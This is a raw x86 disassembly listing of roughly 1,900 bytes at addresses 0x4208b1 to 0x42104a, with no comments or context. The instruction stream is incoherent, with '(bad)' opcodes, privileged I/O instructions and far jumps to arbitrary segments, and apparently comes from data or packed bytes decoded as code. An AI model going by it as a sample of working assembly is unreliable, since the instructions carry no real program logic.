  4208b1:	lea    ebp,[ebp+0x795786a2]
  4208b7:	lock mov BYTE PTR [esi-0x23d17258],dh
  4208be:	dec    esi
  4208bf:	xor    esp,DWORD PTR [edi+eiz*1]
  4208c2:	mov    ecx,0xdbf0b457
  4208c7:	xchg   edx,eax
  4208c8:	sbb    edx,DWORD PTR [ebp+0x660a8a16]
  4208ce:	popf   
  4208cf:	ins    DWORD PTR es:[edi],dx
  4208d0:	pop    ss
  4208d1:	cmp    ah,BYTE PTR [edx+0x2d]
  4208d4:	mov    al,ds:0x90ac6a86
  4208d9:	or     ecx,esi
  4208db:	push   0x68dda362
  4208e0:	ror    edi,0x68
  4208e3:	hlt    
  4208e4:	add    dh,BYTE PTR [eax]
  4208e6:	push   ebp
  4208e7:	mov    edx,0x8a0d0b80
  4208ec:	call   0xe7ccd043
  4208f1:	push   eax
  4208f2:	xchg   ebp,eax
  4208f3:	outs   dx,DWORD PTR ds:[esi]
  4208f4:	aaa    
  4208f5:	ins    BYTE PTR es:[edi],dx
  4208f6:	popa   
  4208f7:	test   BYTE PTR [eax+ecx*8],dl
  4208fa:	add    BYTE PTR [edi-0x17],bh
  4208fd:	pop    ebx
  4208fe:	or     ebp,DWORD PTR [esi-0x5f]
  420901:	stos   BYTE PTR es:[edi],al
  420902:	jae    0x42097d
  420904:	and    ebp,DWORD PTR [ebp+0x62]
  420907:	mul    esp
  420909:	add    DWORD PTR [ebx],ecx
  42090b:	lods   eax,DWORD PTR ds:[esi]
  42090c:	or     eax,ecx
  42090e:	or     BYTE PTR ds:0x58abe5ca,ah
  420914:	pop    eax
  420915:	pop    eax
  420916:	sub    BYTE PTR ds:0xa33db9c4,bh
  42091c:	in     eax,0x8a
  42091e:	test   DWORD PTR [ebp-0x44f9248a],ecx
  420924:	pop    ss
  420925:	popf   
  420926:	sbb    eax,0x1f890629
  42092b:	ins    DWORD PTR es:[edi],dx
  42092c:	arpl   WORD PTR [ecx-0x5d],sp
  42092f:	xchg   ecx,eax
  420930:	and    ch,BYTE PTR [ebp+ecx*8-0x37bd0f6e]
  420937:	(bad)  
  420938:	outs   dx,BYTE PTR ds:[esi]
  420939:	test   DWORD PTR [eax-0x5df121a2],eax
  42093f:	gs fwait
  420941:	and    ch,bl
  420943:	cmp    ah,BYTE PTR [edx-0x17]
  420946:	mov    ah,BYTE PTR [esi]
  420948:	cmp    BYTE PTR [ebp-0x464ca1a7],0x36
  42094f:	imul   ebp,DWORD PTR [ebp+0x6c],0x6c
  420953:	retf   0x4e2e
  420956:	sahf   
  420957:	inc    ebp
  420958:	or     DWORD PTR [ecx-0x56],0xffffffb7
  42095c:	lods   eax,DWORD PTR ds:[esi]
  42095d:	jb     0x4209ca
  42095f:	xchg   esp,eax
  420960:	pop    ebx
  420961:	pop    es
  420962:	add    eax,0x627a5af7
  420967:	call   0x1577ba27
  42096c:	mov    ebx,0xdc7e987c
  420971:	jnp    0x420969
  420973:	push   cs
  420974:	push   es
  420975:	dec    ebx
  420976:	test   DWORD PTR [ebx+0x11],ebx
  420979:	out    dx,eax
  42097a:	lds    eax,FWORD PTR [ecx]
  42097c:	or     BYTE PTR [ebx-0xb],dh
  42097f:	mov    esp,0x54c2e064
  420984:	les    ecx,FWORD PTR [edi-0x50]
  420987:	imul   edi,DWORD PTR [ebp-0x6a],0x2db11000
  42098e:	mov    cl,0xb5
  420990:	adc    al,BYTE PTR [esi+0x6d]
  420993:	out    dx,al
  420994:	pusha  
  420995:	das    
  420996:	jl     0x4209fb
  420998:	imul   ebp,DWORD PTR [ebx],0xffffffbf
  42099b:	adc    dl,BYTE PTR [edi]
  42099d:	retf   0x7100
  4209a0:	mov    ebp,0xb6a96202
  4209a5:	fdiv   DWORD PTR [eax-0x1d893a8b]
  4209ab:	je     0x420a24
  4209ad:	adc    DWORD PTR ds:0xb8e5681,ebp
  4209b3:	pop    ebx
  4209b4:	mov    ecx,0x58e967b0
  4209b9:	sahf   
  4209ba:	int    0xe
  4209bc:	or     BYTE PTR [ebx+0x6d2b5a09],0xb
  4209c3:	fbstp  TBYTE PTR [ecx]
  4209c5:	adc    ebp,DWORD PTR ds:[edx-0x4925bbe2]
  4209cc:	ins    DWORD PTR es:[edi],dx
  4209cd:	mov    bh,0x1f
  4209cf:	sbb    eax,0x35570e8d
  4209d4:	pushf  
  4209d5:	sbb    ch,BYTE PTR [edx]
  4209d7:	cmp    BYTE PTR [eax+0x58],bl
  4209da:	fcomp  st(2)
  4209dc:	jno    0x420992
  4209de:	push   ss
  4209df:	mov    ch,0xca
  4209e1:	mov    BYTE PTR [ebx-0x4d],dh
  4209e4:	outs   dx,BYTE PTR ds:[esi]
  4209e5:	or     eax,0xd607585a
  4209ea:	or     eax,0x2d6ec430
  4209ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209f0:	fistp  DWORD PTR [esi+0x7708d4b8]
  4209f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209f7:	aam    0x67
  4209f9:	add    al,0xec
  4209fb:	add    ah,BYTE PTR [eax]
  4209fd:	fcom   QWORD PTR [esi]
  4209ff:	fisubr DWORD PTR [ebp+0xc]
  420a02:	push   0xfa172d44
  420a07:	out    dx,al
  420a08:	mov    DWORD PTR [esi+ecx*4],esp
  420a0b:	popa   
  420a0c:	imul   esp,DWORD PTR [ecx-0x57],0x2e583783
  420a13:	es pushf 
  420a15:	fstp   DWORD PTR [ebx]
  420a17:	sbb    ebp,DWORD PTR [ebp-0x1bb93198]
  420a1d:	std    
  420a1e:	cmp    al,0x48
  420a20:	sub    eax,0xf56eb46d
  420a25:	pop    ss
  420a26:	daa    
  420a27:	cmp    eax,0x7d77592d
  420a2c:	cld    
  420a2d:	push   edx
  420a2e:	mov    ecx,0xb7ba23b1
  420a33:	jl     0x420a27
  420a35:	ds ja  0x420ab6
  420a38:	add    BYTE PTR ds:0xa0142e74,dl
  420a3e:	mov    dh,0xc9
  420a40:	add    eax,0xe9388838
  420a45:	jecxz  0x420a4e
  420a47:	xchg   edi,eax
  420a48:	xchg   edi,eax
  420a49:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  420a4b:	add    BYTE PTR [esi],dh
  420a4d:	dec    edx
  420a4e:	push   esp
  420a4f:	jno    0x420acb
  420a51:	cli    
  420a52:	dec    ebx
  420a53:	mov    dl,dh
  420a55:	es push 0xefe69081
  420a5b:	addr16 dec edx
  420a5d:	inc    esp
  420a5e:	pop    ebx
  420a5f:	fiadd  DWORD PTR [ebp+0x12]
  420a62:	popa   
  420a63:	add    DWORD PTR [edi+edx*8-0x2069f594],edi
  420a6a:	jp     0x420a5d
  420a6c:	repnz add BYTE PTR [ebx],ah
  420a6f:	out    dx,eax
  420a70:	loope  0x420ad8
  420a72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a73:	sub    al,0xa
  420a75:	push   eax
  420a76:	mov    ebp,DWORD PTR [edx-0x3a]
  420a79:	test   BYTE PTR [ebp+ebx*8-0x28],0x96
  420a7e:	xchg   esi,eax
  420a7f:	retf   
  420a80:	out    dx,eax
  420a81:	adc    BYTE PTR [ebx+ebp*2+0x52decfd5],0xa8
  420a89:	lea    ecx,ds:0x465c05aa
  420a8f:	xor    ecx,ebp
  420a91:	ins    BYTE PTR es:[edi],dx
  420a92:	xor    eax,0x11a96c15
  420a97:	inc    eax
  420a98:	cmp    BYTE PTR [esi+0x2b],ch
  420a9b:	ins    DWORD PTR es:[edi],dx
  420a9c:	test   DWORD PTR [edi],eax
  420a9e:	push   ss
  420a9f:	outs   dx,BYTE PTR ds:[esi]
  420aa0:	push   es
  420aa1:	aas    
  420aa2:	loopne 0x420af0
  420aa4:	jecxz  0x420a42
  420aa6:	stos   BYTE PTR es:[edi],al
  420aa7:	les    ebp,FWORD PTR [ebp-0x25]
  420aaa:	mov    dh,0x16
  420aac:	add    ah,al
  420aae:	stc    
  420aaf:	or     eax,DWORD PTR [ecx+ebp*8]
  420ab2:	add    bl,BYTE PTR [eax+0x4b8d5bb6]
  420ab8:	adc    DWORD PTR [edx-0x6f],esi
  420abb:	(bad)  
  420abc:	pop    ebx
  420abd:	inc    edi
  420abe:	fidiv  WORD PTR [ebp+esi*2-0x3e]
  420ac2:	ret    0xd6d6
  420ac5:	xor    eax,0xcaeba356
  420aca:	inc    ebx
  420acb:	sub    DWORD PTR [ebp+0x6e],edx
  420ace:	ins    BYTE PTR es:[edi],dx
  420acf:	fcmovnb st,st(2)
  420ad1:	sub    BYTE PTR [eax+eiz*2-0x11ee918f],dl
  420ad8:	(bad)  
  420ad9:	data16 mov ch,bl
  420adc:	sub    BYTE PTR [ebp-0x25],0xfe
  420ae0:	sub    BYTE PTR [esp+ebp*8],0x17
  420ae4:	mov    ecx,0xbb2f736d
  420ae9:	mov    ch,0xd
  420aeb:	jno    0x420b24
  420aed:	mov    dl,0x6
  420aef:	pop    ds
  420af0:	xlat   BYTE PTR ds:[ebx]
  420af1:	push   esi
  420af2:	bound  ecx,QWORD PTR [edx]
  420af4:	popf   
  420af5:	cmp    ebp,DWORD PTR [esi]
  420af7:	sub    eax,0x11c86d6d
  420afc:	je     0x420ad6
  420afe:	jno    0x420b30
  420b00:	outs   dx,BYTE PTR ds:[esi]
  420b01:	inc    ecx
  420b02:	rcl    edx,0x46
  420b05:	mov    ebx,0xe26ab550
  420b0a:	pop    ss
  420b0b:	mov    cl,BYTE PTR [ebx+0x50]
  420b0e:	add    bh,BYTE PTR [eax+0x1913cb6d]
  420b14:	mov    al,0x6
  420b16:	sub    DWORD PTR [esi+0x47],edx
  420b19:	ins    DWORD PTR es:[edi],dx
  420b1a:	or     esi,DWORD PTR [edi-0x15705d2]
  420b20:	cld    
  420b21:	imul   eax,DWORD PTR [ebp+0x3664bc6d],0x16
  420b28:	mov    ds:0x2983daad,al
  420b2d:	jae    0x420b7f
  420b2f:	jmp    0x74d4:0xb6ed5b51
  420b36:	push   ebx
  420b37:	rcl    BYTE PTR [esp+ebp*8],0x76
  420b3b:	add    ah,0xf2
  420b3e:	adc    dh,BYTE PTR [eax+0x3f5a1b95]
  420b44:	xor    eax,0xdaeb892f
  420b49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b4a:	shl    BYTE PTR [ebp+0x6bb72bda],cl
  420b50:	inc    ecx
  420b51:	sub    eax,0xb4175cd4
  420b56:	ins    DWORD PTR es:[edi],dx
  420b57:	pop    ss
  420b58:	sub    BYTE PTR ds:0x539508b5,dl
  420b5e:	xchg   ebx,eax
  420b5f:	repnz outs dx,BYTE PTR ds:[esi]
  420b61:	fwait
  420b62:	mov    eax,ds:0xb5978a29
  420b67:	(bad)  
  420b68:	(bad)  
  420b69:	das    
  420b6a:	mov    al,0x89
  420b6c:	add    BYTE PTR [ebx],bl
  420b6e:	fld    TBYTE PTR [edi]
  420b70:	out    0x43,eax
  420b72:	(bad)  
  420b74:	std    
  420b75:	and    al,0xdf
  420b77:	or     ebp,ebp
  420b79:	mov    dh,0xd4
  420b7b:	rcl    DWORD PTR [esi+0x5deae320],0x96
  420b82:	push   0xb6dd2255
  420b87:	sbb    cl,BYTE PTR [eax+0x46f94379]
  420b8d:	neg    DWORD PTR [edi-0x17]
  420b90:	add    esi,DWORD PTR [edi]
  420b92:	sbb    al,BYTE PTR [eax+0x5c98d54f]
  420b98:	leave  
  420b99:	add    DWORD PTR [esi],0x8ae819c5
  420b9f:	sbb    eax,0x2abd9c05
  420ba4:	jle    0x420b65
  420ba6:	jno    0x420c09
  420ba8:	test   eax,0x53a6675d
  420bad:	mov    eax,ds:0x65caaa1a
  420bb2:	or     dh,dl
  420bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bb5:	jbe    0x420b58
  420bb7:	leave  
  420bb8:	jl     0x420c21
  420bba:	cmp    edx,DWORD PTR [edi]
  420bbc:	cwde   
  420bbd:	pop    esp
  420bbe:	adc    eax,0xb6ddaa9a
  420bc3:	lods   eax,DWORD PTR ds:[esi]
  420bc4:	pop    es
  420bc5:	fwait
  420bc6:	or     eax,DWORD PTR [ecx+0x62]
  420bc9:	xchg   esi,eax
  420bca:	fmulp  st(0),st
  420bcc:	fiadd  DWORD PTR [ebp+0x586edb6d]
  420bd2:	cmp    BYTE PTR [ebp-0x17],0x4e
  420bd6:	cmp    eax,0x6c0e0555
  420bdb:	fmul   QWORD PTR [edx+0x37]
  420bde:	sbb    eax,DWORD PTR [eax+eax*8]
  420be1:	xchg   edx,eax
  420be2:	add    bl,BYTE PTR [eax]
  420be4:	into   
  420be5:	or     al,0x3d
  420be7:	pop    eax
  420be8:	sub    al,BYTE PTR [eax+0x13]
  420beb:	fwait
  420bec:	push   es
  420bed:	jae    0x420bc3
  420bef:	fnsave cs:[esi+0x1cd69636]
  420bf6:	pop    ebp
  420bf7:	inc    ebp
  420bf8:	and    eax,0x2c4c023a
  420bfd:	pop    eax
  420bfe:	fsubr  DWORD PTR [eax-0x5d]
  420c01:	inc    edi
  420c02:	push   esp
  420c03:	mov    dl,0x94
  420c05:	mov    eax,ds:0xad81b12b
  420c0a:	fcomp  QWORD PTR [eax-0xf]
  420c0d:	sahf   
  420c0e:	mov    cl,0x7a
  420c10:	call   0x6e906dbf
  420c15:	mov    ch,0xdb
  420c17:	and    BYTE PTR [eax-0x5085d68b],0x2
  420c1e:	rcl    edx,0x5e
  420c21:	mov    ch,0xb1
  420c23:	sub    eax,0xbc200ab5
  420c28:	inc    ecx
  420c29:	lds    esi,FWORD PTR [eax]
  420c2b:	xchg   DWORD PTR [ecx+0x13b412c0],esi
  420c31:	lahf   
  420c32:	outs   dx,DWORD PTR ds:[esi]
  420c33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c34:	sub    eax,0xb6aa50b1
  420c39:	mov    dh,0xff
  420c3b:	mov    bl,0xc2
  420c3d:	xor    DWORD PTR [esi],0x21
  420c40:	add    dl,ch
  420c42:	mov    edx,0x1c9dfb5
  420c47:	aad    0x2b
  420c49:	or     eax,0x9696da0f
  420c4e:	mov    dh,0xe0
  420c50:	sti    
  420c51:	fnstsw WORD PTR [esi]
  420c53:	inc    esp
  420c54:	push   0x23
  420c56:	and    BYTE PTR [edx+eiz*2],dh
  420c59:	fistp  DWORD PTR [edx-0x5]
  420c5c:	iret   
  420c5d:	hlt    
  420c5e:	cmp    eax,0xb0a7c9f5
  420c63:	shr    BYTE PTR [esi],1
  420c65:	ins    DWORD PTR es:[edi],dx
  420c66:	iret   
  420c67:	mov    ds:0x8fc40fbf,al
  420c6c:	mov    ch,0x5f
  420c6e:	sbb    ecx,DWORD PTR [ebp+0xe5eb6db]
  420c74:	add    eax,0xc279290e
  420c79:	setbe  BYTE PTR [ebx-0x4af493eb]
  420c80:	pop    edx
  420c81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c82:	out    dx,eax
  420c83:	imul   eax,DWORD PTR [ecx+eax*4+0x4a],0x7da16185
  420c8b:	test   DWORD PTR [edi+0x6da13791],esp
  420c91:	mov    bh,0xd8
  420c93:	pop    ss
  420c94:	ror    BYTE PTR [ecx],0x25
  420c97:	add    ebx,esp
  420c99:	dec    eax
  420c9a:	inc    esp
  420c9b:	mov    esi,DWORD PTR [esi-0x22926924]
  420ca1:	pop    esp
  420ca2:	popa   
  420ca3:	stc    
  420ca4:	gs call 0xf5b6:0xebf5651f
  420cac:	rcl    DWORD PTR [ecx-0x44],0x64
  420cb0:	push   edx
  420cb1:	add    bh,BYTE PTR [ebp+0xf]
  420cb4:	mov    al,bh
  420cb6:	outs   dx,DWORD PTR ds:[esi]
  420cb7:	push   edi
  420cb8:	mov    cl,0xf4
  420cba:	mov    esp,0x60ae2fff
  420cbf:	sub    bh,BYTE PTR [edi+0x74a176e6]
  420cc5:	mov    esp,DWORD PTR [ebp-0x76]
  420cc8:	sub    al,0xbe
  420cca:	inc    esp
  420ccb:	pop    es
  420ccc:	loope  0x420cdb
  420cce:	das    
  420ccf:	ins    DWORD PTR es:[edi],dx
  420cd0:	imul   esi,DWORD PTR [edi],0xffffffb6
  420cd3:	loopne 0x420d03
  420cd5:	adc    eax,0x4ac57d26
  420cda:	xlat   BYTE PTR ds:[ebx]
  420cdb:	xchg   edx,eax
  420cdc:	pop    ebx
  420cdd:	or     eax,DWORD PTR [esi-0x5c91513e]
  420ce3:	icebp  
  420ce4:	ins    DWORD PTR es:[edi],dx
  420ce5:	ret    0xe53d
  420ce8:	in     eax,dx
  420ce9:	(bad)  
  420cea:	(bad)  
  420ceb:	outs   dx,BYTE PTR ds:[esi]
  420cec:	bound  esp,QWORD PTR [edx]
  420cee:	or     bl,BYTE PTR [ebx+ebx*4-0x4e]
  420cf2:	sub    al,dl
  420cf4:	pop    esp
  420cf5:	sbb    eax,0xad8595b6
  420cfa:	push   ebp
  420cfb:	and    BYTE PTR [ebx],0x76
  420cfe:	aas    
  420cff:	dec    edx
  420d00:	dec    BYTE PTR [edi-0x24f4492a]
  420d06:	mov    eax,0xa6825926
  420d0b:	and    eax,0x26bc6105
  420d10:	ins    BYTE PTR es:[edi],dx
  420d11:	inc    eax
  420d12:	sbb    ebx,ebx
  420d14:	xor    DWORD PTR [ebx-0x823e192],eax
  420d1a:	fsubr  DWORD PTR ds:0x6f6f2d6c
  420d20:	aam    0x0
  420d22:	dec    eax
  420d23:	push   ss
  420d24:	pop    eax
  420d25:	push   eax
  420d26:	popf   
  420d27:	or     al,BYTE PTR [esi+eax*4]
  420d2a:	pusha  
  420d2b:	mov    ebx,0x147aa429
  420d30:	push   ebx
  420d31:	retf   
  420d32:	ins    DWORD PTR es:[edi],dx
  420d33:	mov    ah,0x85
  420d35:	sbb    esi,DWORD PTR [esp+ebp*4]
  420d38:	and    ch,cl
  420d3a:	jle    0x420d3a
  420d3c:	mov    bl,BYTE PTR [ebx]
  420d3e:	mov    dh,0x2b
  420d40:	fsubr  DWORD PTR [esi-0x2d]
  420d43:	into   
  420d44:	adc    eax,edx
  420d46:	xchg   edx,eax
  420d47:	adc    DWORD PTR [ebp+0x1b681dc9],0x5f
  420d4e:	fcmovnbe st,st(1)
  420d50:	pop    ecx
  420d51:	mov    ebx,0x46b12af1
  420d56:	sbb    ah,BYTE PTR [ecx+0x63]
  420d59:	mov    eax,ds:0x4011ef95
  420d5e:	or     DWORD PTR [eax],esi
  420d60:	or     BYTE PTR [edx+0x6d8ddb4b],dh
  420d66:	sbb    DWORD PTR [esi],ecx
  420d68:	sbb    al,0x4b
  420d6a:	aaa    
  420d6b:	test   al,0xe3
  420d6d:	fwait
  420d6e:	sti    
  420d6f:	das    
  420d70:	add    esp,ebx
  420d72:	push   0x2fb6204b
  420d77:	aas    
  420d78:	cmp    eax,0xbab6bace
  420d7d:	xor    BYTE PTR [ebx+eiz*2-0x356b6b7d],bh
  420d84:	push   es
  420d85:	mov    cl,0xd1
  420d87:	xchg   esi,eax
  420d88:	and    eax,0x37081b34
  420d8d:	dec    esi
  420d8e:	or     BYTE PTR [ebp+0x21b6d6db],0xa0
  420d95:	push   0x56e2910d
  420d9a:	dec    eax
  420d9b:	int3   
  420d9c:	js     0x420d52
  420d9e:	adc    al,0xb4
  420da0:	test   DWORD PTR [esi],ebx
  420da2:	xor    al,0x33
  420da4:	sar    DWORD PTR [ebp-0x492f05d4],1
  420daa:	ins    BYTE PTR es:[edi],dx
  420dab:	(bad)  
  420dac:	ficomp WORD PTR [ecx-0x29]
  420daf:	inc    esi
  420db0:	ds dec ebp
  420db2:	push   ebx
  420db3:	fnsave [esi-0xdd2dc53]
  420db9:	sbb    eax,0x38d0539b
  420dbe:	mov    dl,0xc7
  420dc0:	(bad)  [esi]
  420dc2:	test   al,0xad
  420dc4:	sbb    eax,0x2177bcad
  420dc9:	fimul  DWORD PTR [eax+0x2]
  420dcc:	or     ebp,DWORD PTR [ebx+ebx*1+0x5b]
  420dd0:	dec    ebp
  420dd1:	jp     0x420e0f
  420dd3:	stos   DWORD PTR es:[edi],eax
  420dd4:	imul   ebp,esi,0x12
  420dd7:	clc    
  420dd8:	mov    ebx,ebx
  420dda:	add    cl,BYTE PTR [ebp-0x533d2a0]
  420de0:	add    eax,0xa57cf7e1
  420de5:	ins    DWORD PTR es:[edi],dx
  420de6:	mov    ds:0xef006a7c,eax
  420deb:	sub    eax,0xa647c360
  420df0:	xchg   edx,eax
  420df1:	fistp  DWORD PTR [eax+0x68]
  420df4:	fstp   TBYTE PTR [edi*4-0x321c5d50]
  420dfb:	ss or  al,0x32
  420dfe:	enter  0xd1b1,0x41
  420e02:	jo     0x420e25
  420e04:	(bad)  
  420e05:	call   0x6c86ce51
  420e0a:	ins    BYTE PTR es:[edi],dx
  420e0b:	(bad)  [esi-0x480119d6]
  420e11:	mov    edi,0x3f1f4112
  420e16:	test   DWORD PTR [di],ebx
  420e19:	push   esp
  420e1a:	sub    ebp,DWORD PTR [ebp+0x69]
  420e1d:	mov    esp,0x6d16b4ba
  420e22:	mov    bh,0x85
  420e24:	repnz pop DWORD PTR [eax]
  420e27:	sbb    dl,bh
  420e29:	inc    ebx
  420e2a:	adc    ebx,edi
  420e2c:	lea    eax,ds:0xdca15c9b
  420e32:	mov    dh,0xad
  420e34:	sbb    DWORD PTR [ebx+eiz*2-0x24a0efa4],edi
  420e3b:	jae    0x420e19
  420e3d:	ror    BYTE PTR [ebp-0xb5a9493],1
  420e43:	xlat   BYTE PTR ds:[ebx]
  420e44:	jge    0x420e19
  420e46:	sbb    ecx,eax
  420e48:	inc    eax
  420e49:	pop    eax
  420e4a:	mov    dh,0x6d
  420e4c:	sti    
  420e4d:	enter  0x5bd5,0x9b
  420e51:	mov    dl,0xfe
  420e53:	lods   al,BYTE PTR ds:[esi]
  420e54:	cmp    edi,DWORD PTR [esi-0x2527692b]
  420e5a:	es jno 0x420eb3
  420e5d:	fild   DWORD PTR [edx]
  420e5f:	sub    al,0x45
  420e61:	xor    al,0xc1
  420e63:	lea    ebp,[ebp+0x47a7dd4f]
  420e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e6a:	push   ds
  420e6b:	call   0xc9f27616
  420e70:	inc    edx
  420e71:	add    DWORD PTR [edx+0x11],ebp
  420e74:	dec    esp
  420e75:	cmp    ah,dh
  420e77:	fdiv   DWORD PTR [esi]
  420e79:	inc    edi
  420e7a:	(bad)  [edx]
  420e7c:	adc    al,0x2a
  420e7e:	rol    BYTE PTR [ecx+0x26],1
  420e81:	or     edx,0x34
  420e84:	push   ecx
  420e85:	pop    ebx
  420e86:	fs mov ?,eax
  420e89:	mov    ebp,DWORD PTR [ebp+0x49]
  420e8c:	iret   
  420e8d:	xchg   edi,eax
  420e8e:	cs sub eax,0x5df55c55
  420e94:	(bad)  
  420e96:	mov    al,ds:0x169c3200
  420e9b:	stos   DWORD PTR es:[edi],eax
  420e9c:	adc    DWORD PTR [ebp-0x6b904573],esi
  420ea2:	lods   eax,DWORD PTR ds:[esi]
  420ea3:	and    DWORD PTR [edx+eax*8+0x1b616176],ebp
  420eaa:	mov    ch,0x3e
  420eac:	pop    es
  420ead:	lahf   
  420eae:	setb   BYTE PTR [ebx]
  420eb1:	inc    esi
  420eb2:	shr    BYTE PTR [ebp-0x25],cl
  420eb5:	retf   0x23a9
  420eb8:	lea    ebx,[edx]
  420eba:	jp     0x420ec1
  420ebc:	ss lahf 
  420ebe:	vmovhpd xmm2,xmm0,QWORD PTR [edi]
  420ec2:	mov    dh,0x2
  420ec4:	cli    
  420ec5:	mov    BYTE PTR [edx+0xa4db96],al
  420ecb:	or     BYTE PTR [eax+0x452c2f2d],al
  420ed1:	inc    eax
  420ed2:	mov    esi,gs
  420ed4:	lods   eax,DWORD PTR ds:[esi]
  420ed5:	add    BYTE PTR [ebx],dl
  420ed7:	out    0x96,eax
  420ed9:	das    
  420eda:	sub    eax,0xa468ec2d
  420edf:	or     ebp,DWORD PTR [ebp-0x17ff9133]
  420ee5:	adc    al,0x6a
  420ee7:	ins    BYTE PTR es:[edi],dx
  420ee8:	pop    ss
  420ee9:	mov    dh,0xaf
  420eeb:	ins    DWORD PTR es:[edi],dx
  420eec:	xchg   edi,eax
  420eed:	push   edx
  420eee:	ret    0xf483
  420ef1:	sbb    BYTE PTR [esi-0x823d34a],dh
  420ef7:	push   esp
  420ef8:	rcr    DWORD PTR [ebx-0x21],1
  420efb:	test   bh,ch
  420efd:	outs   dx,BYTE PTR ds:[esi]
  420efe:	xor    al,0x58
  420f00:	fcmovu st,st(0)
  420f02:	pop    edx
  420f03:	sbb    eax,0x75cf67d3
  420f08:	inc    esp
  420f09:	js     0x420eb6
  420f0b:	add    DWORD PTR [ebx+0x5c],edx
  420f0e:	xchg   edi,eax
  420f0f:	jae    0x420f0c
  420f11:	scas   eax,DWORD PTR es:[edi]
  420f12:	cmp    al,0x38
  420f14:	mov    cs,WORD PTR [ebx]
  420f16:	fwait
  420f17:	test   eax,0x7d702176
  420f1c:	stos   DWORD PTR es:[edi],eax
  420f1d:	sti    
  420f1e:	sub    eax,0x3c0504e2
  420f23:	fisubr DWORD PTR [esi-0x74]
  420f26:	push   ds
  420f27:	test   ebp,0xb6ed4c83
  420f2d:	mov    ch,0xb1
  420f2f:	dec    eax
  420f30:	jno    0x420f71
  420f32:	cmp    DWORD PTR [ecx+0x7bed89e2],edx
  420f38:	push   ebx
  420f39:	lods   eax,DWORD PTR ds:[esi]
  420f3a:	ins    DWORD PTR es:[edi],dx
  420f3b:	imul   edx,DWORD PTR [eax+ecx*1],0x4a
  420f3f:	pop    es
  420f40:	loopne 0x420f55
  420f42:	test   eax,0xb6db70a9
  420f47:	adc    BYTE PTR [ecx+0x2f6be620],bh
  420f4d:	sub    al,0x24
  420f4f:	cmp    eax,0xdadc14a7
  420f54:	ins    DWORD PTR es:[edi],dx
  420f55:	sbb    DWORD PTR [eax+0x23953884],0xffffff90
  420f5c:	dec    edx
  420f5d:	and    eax,0x69d0bb57
  420f62:	aas    
  420f63:	cli    
  420f64:	aaa    
  420f65:	mov    cl,0xe0
  420f67:	icebp  
  420f68:	xchg   edx,eax
  420f69:	sub    DWORD PTR [eax-0x23bd5530],edi
  420f6f:	mov    ds:0xd2788796,eax
  420f74:	lods   eax,DWORD PTR ds:[esi]
  420f75:	test   DWORD PTR [esi-0x2022d696],esi
  420f7b:	mov    DWORD PTR ds:0xdc5914a4,edi
  420f81:	fcmovbe st,st(6)
  420f83:	ret    0x6adc
  420f86:	retf   
  420f87:	jo     0x420f9f
  420f89:	pop    esp
  420f8a:	inc    ecx
  420f8b:	mov    edx,DWORD PTR [edi]
  420f8d:	push   esi
  420f8e:	mov    ch,0xd0
  420f90:	add    eax,ecx
  420f92:	cdq    
  420f93:	mov    ebx,DWORD PTR [ebx-0x27a496d1]
  420f99:	mov    dh,0x3b
  420f9b:	(bad)  
  420f9c:	and    BYTE PTR [edi],cl
  420f9e:	pop    ebx
  420f9f:	out    0x11,al
  420fa1:	retf   
  420fa2:	inc    edi
  420fa3:	ins    BYTE PTR es:[edi],dx
  420fa4:	dec    ebp
  420fa5:	jo     0x421010
  420fa7:	not    DWORD PTR [ebx-0xb]
  420faa:	jo     0x420f8c
  420fac:	leave  
  420fad:	adc    esi,edx
  420faf:	sub    eax,0x120bb6b4
  420fb4:	xchg   edx,eax
  420fb5:	and    esi,DWORD PTR ds:0x8a2b6d32
  420fbb:	sbb    ch,BYTE PTR ss:[edx-0x45]
  420fbf:	into   
  420fc0:	test   al,0x5f
  420fc2:	push   ebx
  420fc3:	and    BYTE PTR [ebp+0x76935a86],bl
  420fc9:	popa   
  420fca:	imul   esi,DWORD PTR [edi],0x45
  420fcd:	in     eax,0xd
  420fcf:	sub    DWORD PTR [edx-0x7a],ecx
  420fd2:	call   0xa5da:0x1a56edb7
  420fd9:	test   DWORD PTR [eax],edx
  420fdb:	cmp    bl,BYTE PTR [ecx-0x73]
  420fde:	cmp    eax,0xb62ad558
  420fe4:	lods   eax,DWORD PTR ds:[esi]
  420fe5:	test   eax,0x42dd151d
  420fea:	enter  0xb841,0xb0
  420fee:	mov    cl,0xd1
  420ff0:	dec    eax
  420ff1:	cmp    dx,WORD PTR [ebp+edi*8+0x6a]
  420ff6:	clc    
  420ff7:	stos   BYTE PTR es:[edi],al
  420ff8:	loope  0x421022
  420ffa:	stos   BYTE PTR es:[edi],al
  420ffb:	push   esp
  420ffc:	loop   0x42106f
  420ffe:	in     eax,dx
  420fff:	ins    BYTE PTR es:[edi],dx
  421000:	fist   DWORD PTR [esi-0x48]
  421003:	mov    cl,0x6e
  421005:	push   esp
  421006:	mov    esi,0xbbe6c53e
  42100b:	pop    ecx
  42100c:	inc    esi
  42100d:	or     ecx,DWORD PTR [ebx-0x4c]
  421010:	adc    BYTE PTR cs:[ebp+eax*8-0x5a],cl
  421015:	pop    ds
  421016:	jnp    0x421037
  421018:	push   es
  421019:	pop    eax
  42101a:	pop    edx
  42101b:	sub    BYTE PTR [eax-0x70],dl
  42101e:	mov    ebx,0x6ef2b62f
  421023:	pop    ebx
  421024:	add    ebx,edx
  421026:	out    0xf0,eax
  421028:	adc    BYTE PTR [esi+0x53124a17],bl
  42102e:	sbb    ebp,DWORD PTR [ebx+ebx*8+0x56]
  421032:	clc    
  421033:	clc    
  421034:	pop    esp
  421035:	xor    edi,DWORD PTR [ebx]
  421037:	pop    edx
  421038:	inc    esp
  421039:	enter  0x500a,0xbb
  42103d:	xchg   ebp,eax
  42103e:	or     BYTE PTR [eax],cl
  421040:	fldcw  WORD PTR [edx+0x47]
  421043:	xchg   ebp,eax
  421044:	pusha  
  421045:	sub    DWORD PTR [ebp-0x25],0xffffff92
  421049:	popf   
  42104a:	sbb    eax,0xc8be8cca
